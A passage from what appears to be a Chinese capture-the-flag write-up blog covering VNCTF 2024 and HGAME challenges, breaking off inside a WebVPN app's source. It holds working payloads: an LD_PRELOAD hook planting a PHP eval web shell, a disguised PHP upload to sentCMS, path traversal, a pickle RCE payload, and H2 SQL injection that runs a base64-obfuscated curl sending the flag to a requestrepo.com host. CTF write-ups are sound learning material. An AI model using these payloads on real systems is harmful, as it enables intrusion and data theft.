class="hljs-keyword">function</span> <span class="hljs-title">handleFileUpload</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$uploadDirectory</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;文件上传失败。&#x27;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-variable">$fileExtension</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<br><br>    <span class="hljs-variable">$newFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-string">&#x27;uploaded_file_&#x27;</span>, <span class="hljs-literal">true</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$fileExtension</span>;<br>    <span class="hljs-variable">$destination</span> = <span class="hljs-variable">$uploadDirectory</span> . <span class="hljs-variable">$newFileName</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$destination</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$destination</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;文件移动失败。&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>文件上传+<code>putenv</code>，<code>LD_PRELOAD</code>劫持<code>whoami</code>命令。<a href="https://blog.csdn.net/qq_63701832/article/details/129760495">参考文章</a>，注意so文件的写法。</p><p>劫持<code>puts</code>函数：<a href="https://cloud.tencent.com/developer/article/1683272">参考文章</a> <a href="https://www.cnblogs.com/gxngxngxn/p/18018284">参考文章2</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">#文件名：hook.c<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hack you!!!&quot;</span>);<br>  system(<span class="hljs-string">&quot;echo &#x27;&lt;?php @eval($_POST[0]);?&gt;&#x27; &gt; /var/www/html/evil.php&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编译成<code>.so</code>文件：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gcc -shared -fPIC 自定义文件<span class="hljs-selector-class">.c</span> -o 生成的库文件<span class="hljs-selector-class">.so</span><br><br>gcc -shared -fPIC hook<span class="hljs-selector-class">.c</span> -o hook<span class="hljs-selector-class">.so</span><br><br><span class="hljs-comment">//export LD_PRELOAD=$PWD/hook.so,Linux上测试的命令</span><br></code></pre></td></tr></table></figure><p>上传(注意匿名函数的文件名，<code>\x00lambda_&#123;x&#125;这种</code>)：</p><blockquote><p>create_function的匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#参考：https://l1nyz-tel.cc/2024/2/18/VNCTF2024-Writeup/</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://d19a0faf-ab06-4db1-85a0-806d02bdeb2f.vnctf2024.manqiu.top:80/index.php&quot;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-number">1</span><br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hook.so&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>&#125;<br>r = requests.post(url,data=data,files=file)<br><span class="hljs-built_in">print</span>(r.text[-<span class="hljs-number">45</span>:]) <span class="hljs-comment">#拿路径</span><br><br>fn = r.text[-<span class="hljs-number">45</span>:].strip()<br><br>param = &#123;<br>    <span class="hljs-string">&quot;challenge&quot;</span>:<span class="hljs-number">1</span>,<br>    <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>:fn,<br>    <span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&#x27;\x00lambda_1&#x27;</span><br>&#125;<br>r = requests.get(url,params=param)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>然后访问<code>evil.php</code>即可<code>RCE</code>:</p><p><img src="/img/GIVENPHP.png" alt="GIVENPHP"></p><h2 id="VNCTF-Trysent"><a href="#VNCTF-Trysent" class="headerlink" title="[VNCTF]Trysent"></a>[VNCTF]Trysent</h2><p>进去发现是这么个东西：</p><p><img src="/img/vnctftrysent1.png" alt="vnctftrysent1"></p><p>一开始还以为要爆破密码啥的，搞了半天。最后随便在网上搜了下<code>sentCMS</code>漏洞还真搜到了：</p><p><a href="https://blog.hanayuzu.top/articles/37dacab4.html">参考文章</a></p><p>简单说就是存在任意文件上传</p><p><code>payload:</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/user/upload/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>b3fe04ce-6471-4b5f-8f81-80f06f65dd1e.vnctf2024.manqiu.top<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=7901b5229557c94bad46e16af23a3728<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>752<br><span class="hljs-attribute">Sec-Ch-Ua</span><span class="hljs-punctuation">: </span>&quot; Not;A Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;97&quot;, &quot;Chromium&quot;;v=&quot;97&quot;<br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36<br><span class="hljs-attribute">Sec-Ch-Ua-Platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryrhx2kYAMYDqoTThz<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://info.ziwugu.vip/<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>b3fe04ce-6471-4b5f-8f81-80f06f65dd1e.vnctf2024.manqiu.top/user/upload/index?name=icon&amp;type=image&amp;limit=1<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,ja-CN;q=0.8,ja;q=0.7,en;q=0.6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;id&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">WU_FILE_0</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">test.jpg</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;type&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">image/jpeg</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;lastModifiedDate&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">Wed Jul <span class="hljs-number">21</span> <span class="hljs-number">2021</span> <span class="hljs-number">18</span>:<span class="hljs-number">15</span>:<span class="hljs-number">25</span> GMT+<span class="hljs-number">0800</span> (-ýÆöô)</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;size&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">164264</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;test.php&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpeg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">JFIF</span><br><span class="language-pgsql">&lt;?php phpinfo();?&gt;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrhx2kYAMYDqoTThz--</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/vnctftrysent2.png" alt="vnctftrysent2"></p><p><code>phpinfo</code>里就有<code>flag</code>：</p><p><img src="/img/vnctftrysent3.png" alt="vnctftrysent3"></p><p><code>vnctf&#123;ced40c3e-024e-4920-865e-a301d6aa6510&#125;</code></p><h2 id="VNCTF-CutePath"><a href="#VNCTF-CutePath" class="headerlink" title="[VNCTF]CutePath"></a>[VNCTF]CutePath</h2><p><a href="https://github.com/ods-im/CuteHttpFileServer/issues/15">参考资料</a></p><p><img src="/img/vnctfcutepath1.png" alt="vnctfcutepath1"></p><p>可以构造类似<code>http://manqiu.top:21891/#/123/../..</code>这样的URL实现目录穿越：</p><p><img src="/img/cuteoath2.png" alt="cuteoath2"></p><p>第二个文件是用户名和密码的base64，直接登录：</p><p><img src="/img/cutepath3.png" alt="cutepath3"></p><p>但这东西下载不了，<code>share</code>文件夹底下的东西才能下载。不过这里存在一个重命名的功能：</p><p><img src="/img/cutepath4.png" alt="cutepath4"></p><p>利用重命名实现目录穿越进行任意文件读取。</p><p>或者在访问网站时抓包可以发现这么个东西，也可以实现目录穿越读文件：</p><p><img src="/img/cutepath1.png" alt="cutepath1"></p><h2 id="HGAME-week2-myflask"><a href="#HGAME-week2-myflask" class="headerlink" title="[HGAME-week2]myflask"></a>[HGAME-week2]myflask</h2><p>题目不出网所以之前用的反弹shell没法做，直接读就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>,))<br>    <br>a = A()<br>a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(a))<br></code></pre></td></tr></table></figure><h2 id="HGAME-week2-search4member"><a href="#HGAME-week2-search4member" class="headerlink" title="[HGAME-week2]search4member"></a>[HGAME-week2]search4member</h2><p><a href="https://blog.csdn.net/Jayjay___/article/details/136117054">参考文章</a></p><p>存在<code>sql</code>注入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (keyword != <span class="hljs-literal">null</span> &amp; !keyword.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM member WHERE intro LIKE &#x27;%&quot;</span> + keyword + <span class="hljs-string">&quot;%&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>所以构造类似<code>关键字%&#39;;--+</code>测试：</p><p><img src="/img/searach4number1.png" alt="searach4number1"></p><p>获取数据库名：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?keyword=哈哈哈%&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span> union <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database();<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/img/search4number2.png" alt="search4number2"></p><p>数据库名为<code>H2</code>，爆表：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">哈哈哈%&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;H2&#x27;;--+<br><span class="hljs-comment">//null，空的</span><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/shineman-zhang/articles/16753095.html">参考文章</a></p><p>主要就是可以利用<code>CREATE ALIAS</code>这东西去创建一个函数别名然后通过调用这个函数去执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS <span class="hljs-keyword">EXEC</span> <span class="hljs-keyword">AS</span> &quot;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&quot;;<br><span class="hljs-keyword">CALL</span> <span class="hljs-keyword">EXEC</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p>所以：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SQL">SJTU<span class="hljs-operator">%</span><span class="hljs-string">&#x27;;CREATE ALIAS EXEC AS &#x27;</span>String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="hljs-keyword">exec</span>(cmd).getInputStream());  if (s.hasNext()) &#123;<span class="hljs-keyword">return</span> s.next();&#125; throw <span class="hljs-keyword">new</span> IllegalArgumentException();&#125;<span class="hljs-string">&#x27;;CALL SJTU%&#x27;</span>;<span class="hljs-keyword">CALL</span> <span class="hljs-keyword">EXEC</span>(<span class="hljs-string">&#x27;bash -c &#123;echo,Y3VybCBgY2F0IC9mbGFnYC50c2NmNWIzZC5yZXF1ZXN0cmVwby5jb20=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>);<span class="hljs-comment">--+</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>curl `cat <span class="hljs-operator">/</span>flag`.tscf5b3d.requestrepo.com<br></code></pre></td></tr></table></figure><p>定义函数的时候不用单引号包裹用界定符<code>$$</code>包裹也行。</p><h2 id="HGAME-week3-WebVPN"><a href="#HGAME-week3-WebVPN" class="headerlink" title="[HGAME-week3]WebVPN"></a>[HGAME-week3]WebVPN</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//app.js</span><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;axios&quot;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">v4</span>: uuidv4 &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;uuid&quot;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express-session&quot;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>;<br><span class="hljs-keyword">const</span> session_name = <span class="hljs-string">&quot;my-webvpn-session-id-&quot;</span> + <span class="hljs-title function_">uuidv4</span>().<span class="hljs-title function_">toString</span>();<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;pug&quot;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;trust proxy&quot;</span>, <span class="hljs-literal">false</span>);<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;public&quot;</span>)));<br>app.<span class="hljs-title function_">use</span>(<br>  <span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">name</span>: session_name,<br>    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">uuidv4</span>().<span class="hljs-title function_">toString</span>(),<br>    <span class="hljs-attr">secure</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span>,<br>  &#125;)<br>);<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br><span class="hljs-keyword">var</span> userStorage = &#123;<br>  <span class="hljs-attr">username</span>: &#123;<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&quot;password&quot;</span>,<br>    <span class="hljs-attr">info</span>: &#123;<br>      <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,<br>    &#125;,<br>    <span class="hljs-attr">strategy</span>: &#123;<br>      <span class="hljs-string">&quot;baidu.com&quot;</span>: <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&quot;google.com&quot;</span>: <span class="hljs-literal">false</span>,<br>    &#125;,<br>  &#125;,<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;<br>  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;<br>    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;__&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-title function_">update</span>(dst[key], src[key]);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    dst[key] = src[key];<br>  &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/proxy&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; username &#125; = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">if</span> (!username) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">let</span> url = (<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span>);<br>    &#125; <span class="hljs-keyword">catch</span> &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid url.&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;<br>    &#125;<br>  &#125;)();<br><br>  <span class="hljs-keyword">if</span> (!url) <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-keyword">if</span> (!userStorage[username].<span class="hljs-property">strategy</span>[url.<span class="hljs-property">hostname</span>]) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;your url is not allowed.&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> headers = req.<span class="hljs-property">headers</span>;<br>    headers.<span class="hljs-property">host</span> = url.<span class="hljs-property">host</span>;<br>    headers.<span class="hljs-property">cookie</span> = headers.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;;&quot;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">cookie</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">var</span> filtered_cookie = <span class="hljs-string">&quot;&quot;</span>;<br>      <span class="hljs-keyword">const</span> [key, value] = cookie.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">trim</span>() !== session_name) &#123;<br>        filtered_cookie += <span class="hljs-string">`<span class="hljs-subst">$&#123;key&#125;</span>=<span class="hljs-subst">$&#123;value&#125;</span>;`</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> filtered_cookie;<br>    &#125;);<br>    <span class="hljs-keyword">const</span> remote_res = <span class="hljs-keyword">await</span> (<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span 